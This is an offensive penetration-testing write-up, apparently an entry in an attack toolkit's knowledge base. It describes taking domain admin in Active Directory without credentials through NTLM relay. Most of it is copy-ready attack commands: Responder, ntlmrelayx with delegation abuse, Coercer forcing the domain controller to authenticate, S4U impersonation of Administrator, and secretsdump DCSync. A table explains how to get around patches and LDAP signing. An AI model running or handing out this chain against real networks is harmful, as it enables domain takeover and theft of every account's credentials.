# [2026-04] NTLM Relay + Coercer → Domain Admin Privileges (No Password Needed)

## Scenario classification
Penetration testing / intranet / AD attacks

## Target overview
With an intranet foothold but no credentials at all, obtained domain admin privileges through an NTLM relay attack chain.

## Complete execution chain

1. After gaining intranet access, start Responder listening (SMB/HTTP off)
   ```bash
   # edit /etc/responder/Responder.conf
   # SMB = Off, HTTP = Off
   responder -I eth0 -v
   ```

2. Start ntlmrelayx relaying to LDAP (for the AD CS attack)
   ```bash
   ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
   ```

3. Use Coercer to force the DC to authenticate to us
   ```bash
   coercer coerce -u '' -p '' -d domain.local \
     -l attacker_ip -t dc01.domain.local --always-continue
   ```

4. The DC machine account's NTLM authentication is relayed to LDAP
5. ntlmrelayx automatically creates a machine account and configures constrained delegation
6. Impersonate the domain admin with S4U2Self + S4U2Proxy
   ```bash
   getST.py -spn cifs/dc01.domain.local \
     -impersonate Administrator \
     domain.local/CREATED_MACHINE\$:'password' -dc-ip 10.0.0.1
   ```

7. DCSync with the ticket
   ```bash
   export KRB5CCNAME=Administrator.ccache
   secretsdump.py -k -no-pass dc01.domain.local
   ```

## Pitfall record

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| Coercer cannot trigger authentication | The target DC is patched against PetitPotam | Switch to PrinterBug (MS-RPRN) | 30min |
| ntlmrelayx reports LDAP signing required | The DC has LDAP signing enabled | Relay to LDAPS (636) or HTTP AD CS instead | 20min |
| The created machine account cannot S4U | Domain policy limits the number of machine accounts created | Use an existing low-privilege domain user account instead | 15min |

## Toolchain findings
- Coercer is more convenient than calling PetitPotam manually and tries several protocols automatically
- The `--delegate-access` parameter of ntlmrelayx is key; it completes the delegation configuration automatically
- If LDAP signing is enabled, relay to the AD CS HTTP endpoint instead (ESC8)

## Key code/commands

```bash
# one-stop full attack chain (needs 3 terminals)
# terminal 1: Responder
responder -I eth0 -v

# terminal 2: ntlmrelayx
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user attacker

# terminal 3: Coercer
coercer coerce -u '' -p '' -d domain.local -l attacker_ip -t dc01.domain.local
```

## Reusable patterns/script snippets

```bash
# quick check of NTLM relay feasibility
# 1. check SMB signing
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 2. check LDAP signing
crackmapexec ldap dc01.domain.local -u '' -p '' -M ldap-checker

# 3. check triggerable protocols
coercer scan -u user -p pass -d domain.local -t dc01.domain.local
```

## Improvement suggestions for this package
- Coercer and Responder are already in routing and bootstrap ✓
- ntlmrelayx belongs to the impacket suite, preinstalled on Kali ✓

## Evolution actions
- [x] No update needed (already covered)

## Environment information
- Kali 2026.1, impacket 0.12.0, coercer 2.4.3
- Target: Windows Server 2022 DC, domain functional level 2016
- Prerequisite: an existing intranet foothold (obtained through a VPN vulnerability)
